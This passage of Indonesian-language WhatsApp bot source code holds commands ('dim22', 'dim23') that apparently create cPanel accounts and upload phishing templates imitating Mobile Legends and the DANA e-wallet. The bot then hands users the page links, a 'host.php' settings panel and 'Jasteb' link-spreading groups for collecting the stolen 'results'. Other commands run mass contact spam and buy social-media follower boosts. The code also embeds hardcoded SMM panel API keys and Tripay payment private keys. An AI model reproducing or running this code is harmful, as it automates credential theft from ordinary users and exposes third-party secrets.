➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner")
        }
break
        


// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB BY DIMAS HOST
case 'dim22' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/dana/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner")
        }
break
        


// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB BY DIMAS HOST
case 'dim23' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/blok/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner")
        }
break
case "listsewa" : {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
reply(`Hai kak👋

*_LIST SEWA BOT RAFATHAR OFFCIAL PAYMENT_*

○ 1 DAY : 5k
○ 3 DAY : 15k
○ 5 DAY : 25k
○ 7 DAY : 45k
○ 10 DAY : 55k
○ 14 DAY : 65k
○ 21 DAY : 75k
○ 30 DAY : 85k
○ PERMANEN : ( Pm Owner )

CARA ORDER
.sewa linkgc|1day`)
}
break
case "ceksaldo-smm": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
        if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
        let md5 = require('md5')
        let apikey_smm = "JrMVEQTPU0gKXRVe1fB1T3zfM"
        let fetch = (...args) => import('node-fetch').then(({
          default: fetch
        }) => fetch(...args))
        let data = {
          api_key: apikey_smm,
        }
        fetch(`https://mrxpanel.com/api/profile`, {
            method: 'POST',
            body: JSON.stringify(data),
            headers: {
              'Content-Type': 'application/json'
            }
          })
          .then(response => response.json())
          .then((data) => {
            anjir = `*── 「 SISA SALDO 」 ──*\n\n*_Saldo : ${data.data.balance}_*\n*_Full name : ${data.data.full_name}_*\n*_username : ${data.data.username}_*`
           Biiofc.sendMessage(from, { text: anjir }, { quoted:m})
          })
}
break;    
case "suntiksmm": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
        if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
        if (!text) return reply(`example .suntiksmm 25 https://youtube.com/shorts/z4tojQ3PmWY?feature=shared 100000`)
     let fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
 let apismm = "JrMVEQTPU0gKXRVe1fB1T3zfM"
        let data = {
          api_key: apikeysmm,
          service: jumlah,
          target: targ,
          quantity: idny,
        }
        fetch('https://mrxpanel.com/api/order', {
            method: 'POST',
            body: JSON.stringify(data),
            header: {
              'Content-Type': 'application/json'
            }
          }).then((response) => response.json())
          .then((res) => {
                if (res.data.message == 'Saldo Anda tidak cukup untuk melakukan pemesanan ini.') { 
            reply(res.data.message)
            }
                    if (res.data.message == 'Pesanan berhasil, pesanan akan diproses.') {
      cap = `*──••• 「 TRANSAKSI BERHASIL 」 •••──*

ID : ${res.data.id}

*_untuk cek transaksi silahkan ketik = .cektransaksi id_*`
         rizalxdzz.sendMessage(from, { caption: cap })
}
          
}
)}
break
case "cektransaksi":
case "cektrx": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
	if (!isOwner) throw ('Khusus Owner')
    if (!text) {
        let errorMessage = '⚠️ *Format salah!*\n\nContoh :\n_cektrx 11012_*';

        return   Biiofc.sendMessage(msg.chat, {text:errorMessage})
    }
    let [refid] = text.split(" ");
    let md5 = require('md5');
    let fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
    let apikeysmm = "JrMVEQTPU0gKXRVe1fB1T3zfM"
    let data = {
          api_key: apikeysmm,
          id: refid,
    };
    let response = await fetch('https://mrxpanel.com/api/status', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
            'Content-Type': 'application/json'
        }
    });
    let result = await response.json();
if (result.status == false) {
  reply(`\n\nPermasalahan :\n${result.data.message} `)
} else {
	let successMessage = `*──••• 「 STATUS TRANSAKSI 」 •••──*

_🆔Tujuan: ${result.data.target}_
_✨ Hrga : ${result.data.price}_
_🧾 Waktu : ${result.data.start_count}_
_📝 Jumblah  : ${result.data.remains}_
_🔢 Status_ : ${result.data.status}
`;

       Biiofc.sendMessage(msg.chat, {text:successMessage})
}
}
break
case 'smmlist':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
        let md5 = require('md5')
        let smmkey = "JrMVEQTPU0gKXRVe1fB1T3zfM"
        let data = {
          api_key: smmkey,        }
        fetch(`https://mrxpanel.com/api/services`, {
            method: 'POST',
            body: JSON.stringify(data),
            headers: {
              'Content-Type': 'application/json'
            }
          })
          .then(response => response.json())
          .then((data) => {
var teks = '*List Layanan*\n\n'
let GG = 0
for (let x of data.data){
teks +=`🆔 id: ${x.id}\n🧨Nama : ${x.name}\n🛒 Kategori : ${x.category}\n💸Price : Rp${x.price}\n📔Deks : ${x.description}\n🦕Type : ${x.type}\n🎈Min Order : ${x.min}\n🌼Max Order : ${x.max}\n Stok : ${x.status}\n\n`
}
reply(teks)
})
}
break
case "deposit-smm":
case "smm": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
	if (!isOwner) throw ('Minimal deposit Rp200000')
      let apikeysmm = "JrMVEQTPU0gKXRVe1fB1T3zfM"
    let md5 = require('md5');
    let fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));;
    let data = {
        api_key: apikeysmm,
    };
    let response = await fetch('https://mrxpanel.com/api/services', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
            'Content-Type': 'application/json'
        }
    });
    let result = await response.json();
	      if (result.status == false) {
  reply(`*Maaf orderan gagal di buat*\n\nPermasalahan :\n${result.data.message} atau Cara order anda salah\n\nDiharapkan sudah faham jika ingin membeli\njika masih tidak faham silahkan ketik ${prefix}owner!\n`)
} else {
	let successMessage = `LIST

📝 ID : _${result.data.id}_

*_UNTUK MELIHAT TRX ID SILHAKAN KETIK trx!!._*`;

   Biiofc.sendMessage(m.chat, {text:successMessage})
}}
break
case 'listdaftar':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
let xx_us = JSON.parse(fs.readFileSync("./freya/user.json"));
let no = 1
let teks_db =`*INFO-DASHBOARD*

*• Terdaftar :* ( ${("id", db_user).length} )`
for (let x of xx_us){
teks_db +=`*User${no++} ${x.name}*\n*ID: @${x.id.split('@')[0]}*\n*Premium: ${x.premium? 'aktif':'tidak'}*\n\n`
}
reply(teks_db)
}
break
case 'daftar':{
 if (cekUser("id", sender) !== null) return reply('Kamu sudah terdaftar !!')
var res_us = `${makeid(10)}`
var user_name = `#GR${makeid(5)}`
let object_user = {"id": sender, "name": user_name, "seri": res_us, "premium": false }
db_user.push(object_user)
fs.writeFileSync('./freya/user.json', JSON.stringify(db_user, 2, null))
reply(`Sukses, Anda Sekarang Sudah Terdaftar✅ @${sender.split("@")[0]}`, [sender])
var verify_teks =`───「 𝗧𝗘𝗥𝗩𝗘𝗥𝗜𝗙𝗜𝗞𝗔𝗦𝗜 」────

○ ID : @${sender.split('@')[0]}
○ Name : ${pushname}
○ Seri : ${res_us}

silahkan ketik .menu
bila tidak bisa mohon
maaf, sc nya private🙏
`
Biiofc.sendMessage(from, {text : verify_teks}, {quoted: hw})
}
break
case "pushkontakmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

┌──『 *MENU PUSHKONTAK* 』
⭔ ${prefix}cekidgc
⭔ ${prefix}listgroup
⭔ ${prefix}pushkontakv1 *idgc|teks*
⭔ ${prefix}pushkontakv2 *teks*
⭔ ${prefix}pushkontakv3 *idgroup|jeda|teks*
⭔ ${prefix}pushkontakv4 *jeda|teks*
⭔ ${prefix}savecontactv1 *idgroup*
⭔ ${prefix}savecontactv2 *teks*
⭔ ${prefix}savekontak *teks*
⭔ ${prefix}getcontact *teks*
⭔ ${prefix}sendkontak *teks*
⭔ ${prefix}bcvideo *teks*
⭔ ${prefix}bcgc *teks*
⭔ ${prefix}jpm *teks*
└──────`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/b89c4d84aa7c448b212df.jpg',
sourceUrl: "https://chat.whatsapp.com/CL0YJxA07oqFUHNzKaQg3C",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
} freya = fs.readFileSync('./freya/audio1.mp3')
Biiofc.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
break  
case 'totalfitur':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
reply(`_Total Semua Fitur Wexx Official ${totalFitur()}_`)
        break
case "buyapipm2": {
  if (cekSaldo(sender,db_saldo) < 35000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp35.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/apipm2.zip'), caption: 'Nih Yapit, Kau Jual Murah Awas Kontol', mimetype: 'application/zip', fileName: 'apipm2.zip'}, {quoted: m})
minSaldo(sender, 35000, db_saldo)
}
break
case "buyeggpm2": {
  if (cekSaldo(sender,db_saldo) < 30000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/pm2.json'), caption: 'Egg Pm2', mimetype: 'application/json', fileName: 'pm2.json'}, {quoted: m})
minSaldo(sender, 30000, db_saldo)
}
break
case "buycasepm2": {
  if (cekSaldo(sender,db_saldo) < 45000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/caseaddpm2.zip'), caption: 'Nih Kontol, Kau Jual Murah Ku Delete!', mimetype: 'application/zip', fileName: 'caseaddpm2.zip'}, {quoted: m})
minSaldo(sender, 45000, db_saldo)
}
break
case 'public': {
if (!isOwner) return m.reply('*khusus Premium*') 
Biiofc.public = true
m.reply('Sukse Change To Public')
}
break
case 'self': {

if (!isOwner) return m.reply('*khusus Premium*')     
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
Biiofc.public = false
m.reply('Sukses Change To Self')
}
break
case 'buysewa':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
reply(`¥ *Price Sewa Bot Rafathar Offcial* €

🔏 3 hari = 5k
🔏 1 minggu = 10k
🔏 2 minggu = 15k
🔏 1 bulan = 20k

Untuk Melanjutkan Sewa Silahkan Ketik Contoh Di bawah
*Contoh => sewabot 1 minggu`)
break
case 'buysewainbot':{                       
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
 if (!isUrl(q) && !q.includes('whatsapp.com')) return reply(`Link Invalid`)
if(!q) return reply('example : sewa https://chat.whatsapp.com/CL0YJxA07oqFUHNzKaQg3C|3day')
if(fs.existsSync(`./freya/sewa/${sender}.json`)) return reply(`Selesaikan pembelian anda sebelumnya`)
               let idproduk = q.split("|")
if (idproduk == "1day") {
global.nama = sewa.rizalxdzzdev1.nama;
global.idproduk = sewa.rizalxdzzdev1.id;
global.harga = sewa.rizalxdzzdev1.harga;
}
if (idproduk == "3day") {
global.nama = sewa.rizalxdzzdev2.nama;
global.idproduk = sewa.rizalxdzzdev2.id;
global.harga = sewa.rizalxdzzdev2.harga;
}
if (idproduk == "5day") {
global.nama = sewa.rizalxdzzdev3.nama;
global.idproduk = sewa.rizalxdzzdev3.id;
global.harga = sewa.rizalxdzzdev3.harga;
}
if (idproduk == "7day") {
global.nama = sewa.rizalxdzzdev4.nama;
global.idproduk = sewa.rizalxdzzdev4.id;
global.harga = sewa.rizalxdzzdev4.harga;
}
if (idproduk == "10day") {
global.nama = sewa.rizalxdzzdev5.nama;
global.idproduk = sewa.rizalxdzzdev5.id;
global.harga = sewa.rizalxdzzdev5.harga;
}
if (idproduk == "14day") {
global.nama = sewa.rizalxdzzdev6.nama;
global.idproduk = sewa.rizalxdzzdev6.id;
global.harga = sewa.rizalxdzzdev6.harga;
}
if (idproduk == "21day") {
global.nama = sewa.rizalxdzzdev7.nama;
global.idproduk = sewa.rizalxdzzdev7.id;
global.harga = sewa.rizalxdzzdev7.harga;
}
if (idproduk == "30day") {
global.nama = sewa.rizalxdzzdev8.nama;
global.idproduk = sewa.rizalxdzzdev8.id;
global.harga = sewa.rizalxdzzdev8.harga;
}
if (idproduk == "permanen") {
global.nama = sewa.rizalxdzzdev9.nama;
global.idproduk = sewa.rizalxdzzdev9.id;
global.harga = sewa.rizalxdzzdev9.harga;
}
const axios = require('axios');
const crypto = require('crypto');
const apiKey = "DEV-WOLUoq8TyMk6o1WYbzCTzbWLkQIBBRJO1TMA9bTO"
const privateKey = "ZEQbg-flMbR-z2jde-wfFeP-NveoC"
const merchant_code = "T25306"
const merchant_ref = 'INV' + randomNomor(1,999999);
const amount = global.harga
const signature = crypto.createHmac('sha256', privateKey).update(merchant_code + merchant_ref + amount).digest('hex');

const data = {
  'method': 'QRIS2',
  'merchant_ref': merchant_ref,
  'amount': amount,
  'customer_name': 'rizalxdzz',
  'customer_email': 'barruranreng@gmail.com',
  'order_items': [{
    'name': 'Bot whatsaap'+amount,
    'price': amount,
    'quantity': 1
  }],
  'return_url': `https://wa.me/6287818371699`,
  'signature': signature
}

axios.post('https://tripay.co.id/api/transaction/create', data, {
  headers: {
    'Authorization': 'Bearer ' + apiKey
  },
  validateStatus: function (status) {
    return status < 999;
  }
})
.then((res) => {	
	let messn = `*── 「 CHECK OUT 」 ──*

_Silahkan Scan Qris Ini Untuk Membayar:_
_》No Ref : ${res.data.data.reference}_
_》Harga : ${formatmoney(res.data.data.amount_received)}_
_》Fee : ${formatmoney(res.data.data.total_fee)}_
_》Total : ${formatmoney(res.data.data.amount)}_
_》Method : Qris Otomatis_
_》Status : ${res.data.data.status}_

Jika Anda Sudah Melakukan Pembayaran Silahkan ketik Konfirsewa no ref Bot Akan Secara Otomatis Masuk Group Tanpa Acc Owner!.`
Biiofc.sendMessage(sender, { caption: messn, image: { url: res.data.data.qr_url } })
let obj = { id: sender, ref: res.data.data.reference, status: res.data.data.status }
fs.writeFileSync(`./freya/sewa/${sender}.json`, JSON.stringify(obj))
    }) 
          
.catch((err) => {
reply(`proses membuat qris`)
}) 
break
}  
case 'konfirsewa':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
	if (!text) return reply(`_Silahkan masukan No Ref_\n\n*_❗Contoh:.konfirsewa T16262662_*`)
   if(!fs.existsSync(`./freya/sewa/${from}.json`)) return reply('Kamu tidak melakukan pembelian')

const axios = require('axios');
const deppo = JSON.parse(fs.readFileSync(`./freya/sewa/${from}.json`))
const apiKey = "9gsUxfRqcUS6f1OTXR0ueqZOj33e9YioeBQ1OEhK"
const privateKey = "spgut-dLZIP-aWBt7-edckK-usRyg"
const merchant_code = "T0001"
var reference = `${checkRefSewa(sender, deppo) ? checkRefSewa(sender, deppo) : args[2]}`
axios.get('https://tripay.co.id/api/transaction/detail?reference=' + text, {
  headers: { 'Authorization': 'Bearer ' + apiKey },
  validateStatus: function (status) {
    return status < 999;
  }
})
.then((res) => {
  if (res.data.success == true) {
    if (res.data.data.status == 'UNPAID') {
let abc = `kamu belum melakukan pembayaran`
Biiofc.sendMessage(from, {text:abc}, Biiofc.user.name, msg)
    } else if (res.data.data.status == 'PAID') {
    	 let brhsl= `*── 「 PEMBAYARAN BERHASIL 」 ──*

_Silahkan Scan Qris Ini Untuk Membayar:_
_》No Ref : ${res.data.data.reference}_
_》Harga : ${formatmoney(res.data.data.amount_received)}_
_》Fee : ${formatmoney(res.data.data.total_fee)}_
_》Total : ${formatmoney(res.data.data.amount)}_
_》Method : Qris Otomatis_
_》Status : ${res.data.data.status}_

Bot Akan Masuk Group Otomatis, Mungkin Membutuhkan Waktu Silahkan Tunggu Sebentar, Terimakasih!.`

Biiofc.sendMessage(msg.chat, {text:brhsl}, Biiofc.user.name, m)
let result = args[1].split('https://chat.whatsapp.com/')[1]
Biiofc.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
      fs.unlinkSync(`./freya/sewa/${from}.json`)
    } else if (res.data.data.status == 'EXPIRED') {
      reply('pembayaran kadaluarsa ')
      fs.unlinkSync(`./freya/sewa/${from}.json`)
    }
  } else {
    reply(res.data.message)
  }
})
.catch((err) => {
  reply(err)
});
break
}            
case 'cancelsewa':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if(!fs.existsSync(`./freya/sewa/${from}.json`)) return reply('Kamu tidak melakukan pembelian')
fs.unlinkSync(`./freya/sewa/${from}.json`)
        reply('Sukses')
break
case "formatpost": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `🥀FORMAT JASPOST BY ${namaCreator}🥀
(BUKAN AKUN MILIK ADMIN)
                   
JUAL AKUN :
SPEK :
HARGA:
MC :
NOMER : wa.me/


NOTE‼️: WAJIB MENGGUNAKAN JASA ADMIN ${namaCreator} AGAR TERHINDAR DARI PENIPUAN


🥀BEE SMART BUYER🥀`
reply(text12)
}
break
case "formatneed": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `*FORMAT JASA NEED AKUN BY ${namaCreator}*
*( BUKAN AKUN ADMIN )*

NAMA PEMILIK : 
AKUN : 
LOGIN : 
HARGA : 
SPEK AKUN : 
MC : 
  
*#TIDAK MENERIMA KIRKON*

📝𝐍𝐎𝐓𝐄 : 
*WAJIB MENGGUNAKAN JASA ADMIN ${namaCreator} UNTUK MENGHINDARI PENIPUAN*

*PERINGATAN ⚠️*
*MOHON NAMA PEMILIK AKUNNYA HARUS DI ISI DENGAN BENAR AGAR SELLER GAMPANG DI CARI*`
reply(text12)
}
break
case "feerekber": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `FEE BER² ${namaCreator}

•0 - 99K ≠ 5K
•99K - 150K ≠ 10K
•151K - 200K ≠ 15K
•201K - 324K ≠ 20K
•325K - 400K ≠ 25K
•401K - 500K ≠ 30K
•501K - 599K ≠ 35K
•600K - 699K ≠ 40K
•700K - 799K ≠ 45K
•800K - 1JT ≠ 50K
•1,1JT - 1,7JT ≠ 70K
•1,8JT - 2,5JT ≠ 100K
•BTBER ≠ 50K 
•TTBEB ≠ 50K`
reply(text12)
}
break
case "formatpencairan": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `FORMAT PENCAIRAN ${namaCreator}

Pencarian : 
No pay    : 
Atas nama :

KESALAHAN PADA NOMOR PENCAIRAN BUKAN JADI TANGGUNG JAWAB KAMI TOLONG DI CEK DENGAN DETAIL DAN SEBENAR-BENARNYA AGAR TIDAK TERJADI KESALAHAN YANG TIDAK DI INGINKAN KESALAHAN PADA NOMOR PENCAIRAN KAMI TIDAK AKAN BERTANGGUNG JAWAB`
reply(text12)
}
break
case "allrec": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `REKAM LAYAR!

